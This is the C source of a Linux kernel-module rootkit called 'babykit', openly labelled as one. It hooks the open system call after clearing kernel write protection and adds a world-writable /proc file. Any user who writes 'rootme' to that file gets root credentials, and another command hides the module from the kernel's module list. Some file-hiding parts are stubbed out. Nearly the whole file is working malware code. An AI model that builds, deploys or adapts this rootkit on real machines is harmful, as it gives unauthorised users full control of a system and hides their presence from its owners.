#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/version.h>
#include <linux/proc_fs.h>


#include <linux/fs.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <asm/uaccess.h>


#define HIDE_PREFIX "hideme_"
#define MAX_BUFFER 513
#define PROCFILE "babykit"

#define CMD_HIDEMOD     "hide_mod"
#define CMD_UNHIDEMOD   "unhide_mod"
#define CMD_ROOTME      "rootme"
#define CMD_HIDEPROC    "hide_proc"
#define CMD_UNHIDEPROC  "unhide_proc"
#define CMD_HIDEFILES   "hide_files"
#define CMD_UNHIDEFILE  "unhide_file"


static char *babykit_cmd_buffer;
static unsigned long cr0;
static unsigned long *sys_call_table;
static struct list_head *prev_module_entry;
static struct proc_dir_entry *proc_file_entry;

// Features:
static char mod_hidden;
static char files_hidden;


static void cmd_hidemod(void);
static void cmd_unhidemod(void);
static void cmd_rootme(void);
static ssize_t babykit_write(struct file *filp, const char __user *buff, size_t len, loff_t *off);
asmlinkage long (*orig_sys_open)(const char __user *filename, int flags, int mode);



unsigned long *get_sys_call_table(void)
{
  unsigned long *temp_sys_call_table;
  unsigned long int addr;

  for (addr = PAGE_OFFSET; addr < ULONG_MAX; addr += sizeof(void *))
  {
    temp_sys_call_table = (unsigned long *)addr;
    if (temp_sys_call_table[__NR_close] == (unsigned long)sys_close)
    return temp_sys_call_table;
  }
  return NULL;
}

static ssize_t babykit_write(struct file *filp, const char __user *buff, size_t len, loff_t *off)
{
  size_t size = (len < MAX_BUFFER) ? len : (MAX_BUFFER - 1);
  
  copy_from_user(babykit_cmd_buffer, buff, size);
  printk("babykit command: %s\n", babykit_cmd_buffer);
  
  if (!strncmp(CMD_ROOTME, babykit_cmd_buffer, strlen(CMD_ROOTME)))
    cmd_rootme();
  else if (!strncmp(CMD_HIDEMOD, babykit_cmd_buffer, strlen(CMD_HIDEMOD)))
    cmd_hidemod();
  else if (!strncmp(CMD_UNHIDEMOD, babykit_cmd_buffer, strlen(CMD_UNHIDEMOD)))
    cmd_unhidemod();
/*
  else if (!strncmp(CMD_HIDEFILES, babykit_cmd_buffer, strlen(CMD_HIDEFILES)))
    cmd_hidefiles();
  else if (!strncmp(CMD_UNHIDEFILES, babykit_cmd_buffer, strlen(CMD_UNHIDEFILES)))
    cmd_unhidefiles();
*/
  return size;
}


static inline void protect_memory(void) 
{
  write_cr0(cr0);
}

static inline void unprotect_memory(void)
{
  write_cr0(cr0 & ~0x00010000);
}


static char *basename(char *path)
{
  char *base = strrchr(path, '/');
  return base ? base + 1 : path;
}

asmlinkage long evil_sys_open(const char __user *filename, int flags, int mode)
{
  if (!strncmp(basename(filename), HIDE_PREFIX, strlen(HIDE_PREFIX)))
  {
    printk("opening hidden file [%s] denied\n", filename);
    //return ENOENT;
  }

  return orig_sys_open(filename, flags, mode);
}

static void cmd_hidemod(void)
{
  if (!mod_hidden)
  {
    prev_module_entry = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    mod_hidden = 1;
  }
}

static void cmd_unhidemod(void)
{
  if (mod_hidden)
  {
    list_add(&THIS_MODULE->list, prev_module_entry);
    mod_hidden = 0;
  }
}

static void cmd_rootme(void)
{
  #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
    current->uid = current->gid = 0;
    current->euid = current->egid = 0;
    current->suid = current->sgid = 0;
    current->fsuid = current->fsgid = 0;
  #else
    struct cred *newcreds;
    newcreds = prepare_creds();

    if (newcreds == NULL)
      return;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
      && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
      || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
      newcreds->uid.val = newcreds->gid.val = 0;
      newcreds->euid.val = newcreds->egid.val = 0;
      newcreds->suid.val = newcreds->sgid.val = 0;
      newcreds->fsuid.val = newcreds->fsgid.val = 0;
    #else
      newcreds->uid = newcreds->gid = 0;
      newcreds->euid = newcreds->egid = 0;
      newcreds->suid = newcreds->sgid = 0;
      newcreds->fsuid = newcreds->fsgid = 0;
    #endif
      commit_creds(newcreds);
  #endif
}


static int __init babykit_init(void)
{
  cr0 = read_cr0();

  babykit_cmd_buffer = kzalloc(MAX_BUFFER, GFP_KERNEL);
  if (!babykit_cmd_buffer)
    return -ENOMEM;
 
  proc_file_entry = create_proc_entry(PROCFILE, 0666, 0);
  if (!proc_file_entry)
    return -ENOMEM;

  proc_file_entry->write_proc = babykit_write;

  // Geting syscall table
  sys_call_table = get_sys_call_table();

  // Original syscalls backup
  orig_sys_open = sys_call_table[__NR_open];

  // Hooking  
  unprotect_memory();
  sys_call_table[__NR_open] = evil_sys_open;
  protect_memory();

  mod_hidden = 0;
  //cmd_hidemod();

	return 0;
}

static void __exit babykit_cleanup(void)
{
  remove_proc_entry(PROCFILE, proc_file_entry);
  kfree(babykit_cmd_buffer);

  // Restore original syscall
  unprotect_memory();
  sys_call_table[__NR_open] = orig_sys_open;
  protect_memory();
}


module_init(babykit_init);
module_exit(babykit_cleanup);

MODULE_AUTHOR("rick2600");
MODULE_LICENSE("Dual BSD/GPL");
MODULE_DESCRIPTION("LKM rootkit");
